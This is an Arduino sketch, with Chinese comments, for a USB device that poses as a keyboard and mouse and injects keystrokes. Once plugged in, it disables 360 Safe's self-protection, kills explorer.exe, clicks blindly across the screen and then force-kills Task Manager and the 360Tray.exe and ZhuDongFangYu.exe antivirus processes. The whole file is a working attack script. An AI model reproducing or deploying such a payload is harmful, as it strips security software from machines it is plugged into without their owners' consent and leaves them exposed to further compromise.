void setup() {
Mouse.begin();//鼠标事件开始
Keyboard.begin();
delay(7000);
 for(int i=0;i<20;i++){
   Mouse.move(-127,-127);//鼠标移动(x,y)
 }
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("\"C:\\Program Files (x86)\\360\\360Safe\\safemon\\360Tray.exe\" /disablesp 1");
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(1000); 
  Keyboard.println("taskkill /F /IM explorer.exe");
  delay(3000);
  for(int b=0;b<30;b++){
    Mouse.move(20,0);
    for(int a=0;a<100;a++){
      Mouse.move(0,8);
      Mouse.click();
    }
    for(int c=0;c<20;c++){
    Mouse.move(0,-127);//鼠标移动(x,y)
    }
  }
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(KEY_DELETE);
Keyboard.release(KEY_LEFT_CTRL);
Keyboard.release(KEY_DELETE);
delay(2000);
Keyboard.press('t');
Keyboard.release('t');
delay(1000);
Keyboard.press('f');
Keyboard.press('n');
Keyboard.release('f');
Keyboard.release('n');
Keyboard.release(KEY_LEFT_ALT);
delay(1000);
Keyboard.print("explorer");
Keyboard.press(KEY_TAB);
Keyboard.release(KEY_TAB);
delay(500);
Keyboard.println(" ");
delay(3000);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(1000); 
  Keyboard.println("cmd /c taskkill /F /IM taskmgr.exe&taskkill /F /IM 360Tray.exe&taskkill /F /IM ZhuDongFangYu.exe");
Mouse.end();//鼠标事件结束
Keyboard.end();
}
void loop() {
  // put your main code here, to run repeatedly:

}
